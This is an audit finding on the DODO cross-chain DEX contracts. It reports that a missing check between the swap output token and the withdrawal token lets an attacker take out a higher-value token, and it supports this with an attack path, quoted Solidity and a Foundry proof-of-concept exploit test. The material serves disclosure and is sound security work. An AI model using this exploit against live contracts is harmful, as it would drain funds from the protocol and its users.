# Token Mismatch Vulnerability in Cross-Chain Swap and Withdraw

### Summary

The absence of validation between the swap output token and withdrawal token in GatewayCrossChain.sol will cause a financial loss for the protocol or users as an attacker will manipulate the withdrawal token to receive high-value tokens instead of low-value ones.

### Root Cause

In [GatewayCrossChain.sol](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L19), and GatewayTransferNative.ssol there are missing check to ensure the targetZRC20 matches the swapDataZ.toToken during cross-chain withdrawals.

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. **Deposit Initiation:** The attacker, acting as `user1`, calls the `depositAndCall` function on the `GatewaySendA` contract on chain A, depositing `100 ether` of `token1A`. They include a payload specifying a swap from `token1Z `to `token2Z `on ZetaChain and `token1Z `as the `targetZRC20 `token for chain B. `targetContract` as `gatewayCrossChain`. This payload is crafted to exploit the mismatch between the swap output and targetZRC20
2. **Bridging to ZetaChain:** The `GatewaySendA `contract transfers `100 ether` of `token1A `to `GatewayEVMMock `on chain A, which bridges the tokens to ZetaChain. The tokens are converted to `100 ether of token1Z`, and the `GatewayZEVMMock `contract receives the transaction, forwarding it to the `GatewayCrossChain `contract.
3. **Swap Execution on ZetaChain:** The GatewayCrossChain contract processes the payload, decoding the swap instructions. It calls DODORouteProxy to swap `100 ether` of `token1Z `for `token2Z`. Based on the price oracle (1 token1Z = 2 token2Z), the swap yields `200 ether` of `token2Z`, which is credited to the `GatewayCrossChain `contract.
```solidity
uint256 outputAmount = _doMixSwap(decoded.swapDataZ, amount, params);
```
4. **Fee Deduction:** The `GatewayCrossChain `contract queries the gas fee for the withdrawal, which is `1 ether` of `token1Z `(as token1Z is set as the gas token). Leaving `200 ether` of `token2Z `as the swap output, but the withdrawal logic uses the `token1Z `amount.
5. **Withdrawal Token Mismatch:** The **GatewayCrossChain** contract, instead of withdrawing `token2Z `(the swap output), uses the attacker-specified `token1Z` as the withdrawal token. It approves `201 ether` of `token1Z `(200 ether swap output equivalent + 1 ether gas fee) to the `GatewayZEVM `contract and initiates a withdrawal of `199 ether` of `token1Z `(after deducting the 1 ether gas fee).
```solidity
            IZRC20(decoded.targetZRC20).approve(
                address(gateway),
                outputAmount + gasFee
            );
```
6. **Bridging to Chain B:** The **GatewayZEVM** contract pulls `199 ether` of `token1Z `to itself, and calls `withdrawAndCall()` of `GatewayEVM`.
```solidity
    function withdrawAndCall(
        bytes memory receiver, 
        uint256 amount,
        address zrc20,
        bytes calldata message, //encoded
        CallOptions calldata callOptions,
        RevertOptions calldata revertOptions
    ) external {
        IZRC20(zrc20).transferFrom(msg.sender, address(this), amount);
        gatewayEVM.withdrawAndCall(
            receiver,
            amount,
            zrc20,
            message,
            callOptions,
            revertOptions
        );
    }
```
8. **Final Delivery:** The `GatewayEVMMock `on chain B calls `GatewaySendB`, which transfers `199 ether` of `token1B `to the attacker’s address (user2). The attacker receives 199 ether of token1B, instead of the intended `200 ether` of `token2B`.


#### The above attack can also be carried out using GatewayTransferNative with just a few changes:
1. Replace `targetContract` as `gatewayTransferNative` from step 1.
2. In the `onCall()` of `gatewayTransferNative` the `outputAmount` will be calculated based on the swapData
            
```solidity
uint256 outputAmount = _doMixSwap(decoded.swapData, amount, params);
```

3. Instead of toToken in swapDataZ transfer of targetZRC20 will take place

```solidity
                TransferHelper.safeTransfer(
                    decoded.targetZRC20,
                    receiver,
                    outputAmount
                );
```
4. Attacker will get these tokens.

### Impact

The protocol suffers huge magnitude of losses of its funds.

### PoC

Add the below mentioned file in `GatewayCrossChain.t.sol`, run it with:
`forge test --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public --match-test test_ExploitTokenMismatch`

```solidity

   // PoC: Exploit token mismatch by swapping token1Z to token2Z but targeting token1Z
    // This test demonstrates that an attacker can receive high-value token1B instead of low-value token2B
    function test_ExploitTokenMismatch() public {
        // Setup: Ensure sufficient balances for cross-chain transfer
        token1Z.mint(address(gatewayCrossChain), 1000 ether);
        token1B.mint(address(gatewayB), 1000 ether);
        // Set token1Z as gasZRC20 to avoid swapping gas fees, simplifying the test
        token1Z.setGasZRC20(address(token1Z));

        // Define transaction parameters
        address targetContract = address(gatewayCrossChain); 
        uint256 amount = 100 ether; // Input amount of token1A
        address asset = address(token1A); // Input token on chain A
        uint32 dstChainId = 2; // Chain B ID
        // Target high-value token1Z (1 token1Z = 2 token2Z) for withdrawal
        address highValueZRC20 = address(token1Z);
        bytes memory sender = abi.encodePacked(user1); // Sender (user1)
        bytes memory receiver = abi.encodePacked(user2); // Receiver (user2)
        // Encode swap data: swap token1Z to token2Z (low-value) on ZetaChain
        bytes memory swapDataZ = encodeCompressedMixSwapParams(
            address(token1Z), // Input: token1Z
            address(token2Z), // Output: token2Z (1 token1Z = 2 token2Z)
            amount,
            0, // Min return amount
            0, // Swap type
            new address[](1), // Empty arrays for additional params
            new address[](1),
            new address[](1),
            0,
            new bytes[](1),
            abi.encode(address(0), 0), // No additional data
            block.timestamp + 600 // Deadline
        );
        // Chain B contract to receive tokens
        bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
        // Withdraw token1B (mapped to token1Z), no swap on chain B
        bytes memory fromTokenB = abi.encodePacked(address(token1B));
        bytes memory toTokenB = abi.encodePacked(address(token1B));
        bytes memory swapDataB = "";
        bytes memory accounts = "";
        // Encode payload with mismatched targetZRC20 (token1Z) and swapDataZ.toToken (token2Z)
        bytes memory payload = encodeMessage(
            dstChainId,
            highValueZRC20, // Exploit: target token1Z instead of token2Z
            sender,
            receiver,
            swapDataZ,
            contractAddress,
            abi.encodePacked(fromTokenB, toTokenB, swapDataB),
            accounts
        );

        // Execute transaction as user1
        vm.startPrank(user1);
        // Approve token1A for gatewaySendA
        token1A.approve(address(gatewaySendA), amount);

        // Initiate cross-chain swap and withdraw
        gatewaySendA.depositAndCall(
            targetContract,
            amount,
            asset,
            dstChainId,
            payload
        );
        vm.stopPrank();

        // Verify results
        // user1 should lose 100 ether of token1A
        assertEq(token1A.balanceOf(user1), initialBalance - amount, "user1 should lose 100 ether of token1A");
        // user2 should receive 199 ether of token1B (200 ether swap output - 1 ether gas fee)
        uint256 expectedToken1B = 199 ether; // 100 ether * 2 (swap rate) - 1 ether (gas)
        assertEq(token1B.balanceOf(user2), expectedToken1B, "user2 should receive 199 ether of token1B");
        console.log("token1B balance of user2:", token1B.balanceOf(user2));
    }

```
